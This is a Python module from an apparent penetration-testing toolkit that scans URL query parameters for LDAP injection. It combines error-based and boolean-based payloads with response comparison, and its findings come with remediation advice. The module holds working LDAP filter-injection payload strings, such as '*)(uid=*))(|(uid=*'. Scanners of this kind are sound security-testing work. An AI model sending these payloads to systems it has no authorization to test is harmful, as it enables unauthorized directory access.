"""PENTRIX ARSENAL module: LDAP injection prober.

Tests URL query parameters for LDAP injection with two techniques:

1. Error-based: payloads that break out of the LDAP filter and look
   for LDAP error signatures in the response (javax.naming messages,
   "Invalid DN syntax", "not a valid ldap filter", ...). Baseline
   filtering avoids flagging pages that already mention LDAP.
2. Boolean-based: pairs of true/false filter payloads
   (e.g. *)(uid=*))(|(uid=* versus a nonsense variant) and compares
   status/length/content hash. A consistent difference means the
   injected filter changed the query result.

Non-intrusive: a handful of GET requests per parameter.
"""

import hashlib
import urllib.parse

from arsenal.findings import make_finding
from arsenal.http import fetch

NAME = "ldap"
DESCRIPTION = (
    "Probes URL parameters for LDAP injection using error-based and "
    "boolean-based techniques."
)
TARGET_KIND = "url"
INTRUSIVE = False

TIMEOUT = 10
MAX_PARAMS = 3

ERROR_PAYLOADS = [
    "*)(&",
    "*()",
    "*)(uid=*))(|(uid=*",
    "admin*",
    "*))(|(uid=*",
]

BOOLEAN_PAIRS = [
    ("*)(uid=*))(|(uid=*", "*)(uid=arsenalnonexistent))(|(uid=*"),
    ("admin*", "arsenalnonexistent*"),
]

ERROR_MARKERS = (
    "javax.naming", "LDAPException", "Invalid DN syntax",
    "not a valid ldap", "Unrecognized filter", "ldap filter",
    "supplied argument is not a valid",
)


def _timeout(ctx):
    cfg = getattr(ctx, "config", None)
    if isinstance(cfg, dict):
        return cfg.get("timeout", TIMEOUT)
    if cfg is not None:
        return getattr(cfg, "timeout", TIMEOUT)
    return TIMEOUT


def _log(ctx, level, msg):
    log = getattr(ctx, "log", None)
    if log is None:
        return
    try:
        getattr(log, level, log.warning)(msg)
    except Exception:
        pass


def _is_http_url(target):
    try:
        parts = urllib.parse.urlsplit(target)
    except Exception:
        return False
    return parts.scheme in ("http", "https") and bool(parts.netloc)


def _host_of(url):
    try:
        return urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        return ""


def _in_scope(target, ctx):
    scope = getattr(ctx, "scope", None)
    if scope is None:
        return True
    try:
        return bool(scope.contains(_host_of(target)))
    except Exception:
        return True


def _finding(**kwargs):
    kwargs.setdefault("module", NAME)
    return make_finding(**kwargs)


def _params(url):
    try:
        return urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query,
                                      keep_blank_values=True)
    except Exception:
        return []


def _with_param(url, idx, new_value):
    parts = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    q[idx] = (q[idx][0], new_value)
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path,
         urllib.parse.urlencode(q), parts.fragment))


def _fetch(url, ctx):
    try:
        return fetch(url, timeout=_timeout(ctx), allow_redirects=True, ctx=ctx)
    except Exception as exc:
        _log(ctx, "debug", "%s: request failed for %s: %s" % (NAME, url, exc))
        return None


def _body_text(resp):
    _status, _headers, body, _final = resp
    try:
        return body.decode("utf-8", errors="replace")
    except Exception:
        return ""


def _fp(resp):
    if resp is None:
        return (0, 0, "")
    status, _h, body, _f = resp
    body = body or b""
    return (status, len(body), hashlib.sha256(body).hexdigest()[:16])


def run(target, ctx):
    """Probe URL parameters for LDAP injection."""
    try:
        return _run(target, ctx)
    except Exception as exc:
        _log(ctx, "warning", "%s failed on %s: %s" % (NAME, target, exc))
        return []


def _run(target, ctx):
    if not _is_http_url(target):
        return []
    if not _in_scope(target, ctx):
        _log(ctx, "warning", "%s: target out of scope: %s" % (NAME, target))
        return []
    params = _params(target)
    if not params:
        return []
    findings = []

    baseline_resp = _fetch(target, ctx)
    if baseline_resp is None:
        return []
    baseline_text = _body_text(baseline_resp).lower()

    for idx, (pname, _pval) in enumerate(params[:MAX_PARAMS]):
        # 1. Error-based.
        for payload in ERROR_PAYLOADS:
            probe_url = _with_param(target, idx, payload)
            resp = _fetch(probe_url, ctx)
            if resp is None:
                continue
            text = _body_text(resp).lower()
            markers = [m for m in ERROR_MARKERS
                       if m in text and m not in baseline_text]
            if markers:
                findings.append(_finding(
                    target=target,
                    severity="high",
                    title="LDAP injection: error signature via %s" % pname,
                    description=(
                        "An LDAP filter-breaking payload in %s produced an "
                        "LDAP error message that the baseline response does "
                        "not contain, which means user input reaches an LDAP "
                        "filter." % pname),
                    evidence=(
                        "Request: %s\nError markers: %s"
                        % (probe_url, ", ".join(markers))),
                    confidence="strong",
                    cwe="CWE-90",
                    remediation=(
                        "Escape LDAP special characters (* ( ) \\ NUL) or use "
                        "parameterized LDAP filters; apply least privilege "
                        "on the bind account.")))
                break
        else:
            # 2. Boolean-based (only when error-based found nothing).
            for true_p, false_p in BOOLEAN_PAIRS:
                t_resp = _fetch(_with_param(target, idx, true_p), ctx)
                f_resp = _fetch(_with_param(target, idx, false_p), ctx)
                if t_resp is None or f_resp is None:
                    continue
                t_fp, f_fp = _fp(t_resp), _fp(f_resp)
                if t_fp[0] == 200 and f_fp[0] == 200 and t_fp[2] != f_fp[2]:
                    # Re-request the true payload to rule out flakiness.
                    t2 = _fetch(_with_param(target, idx, true_p), ctx)
                    if t2 is not None and _fp(t2)[2] == t_fp[2]:
                        findings.append(_finding(
                            target=target,
                            severity="medium",
                            title="Possible blind LDAP injection via %s" % pname,
                            description=(
                                "True/false LDAP filter payloads in %s "
                                "returned consistently different responses, "
                                "which suggests the injected filter changes "
                                "the query result." % pname),
                            evidence=(
                                "Request (true): %s\nTrue: status=%s len=%s "
                                "hash=%s\nFalse: status=%s len=%s hash=%s"
                                % (_with_param(target, idx, true_p),
                                   t_fp[0], t_fp[1], t_fp[2],
                                   f_fp[0], f_fp[1], f_fp[2])),
                            confidence="review",
                            cwe="CWE-90",
                            remediation="Escape LDAP metacharacters; use "
                                        "parameterized filters."))
                        break
    return findings
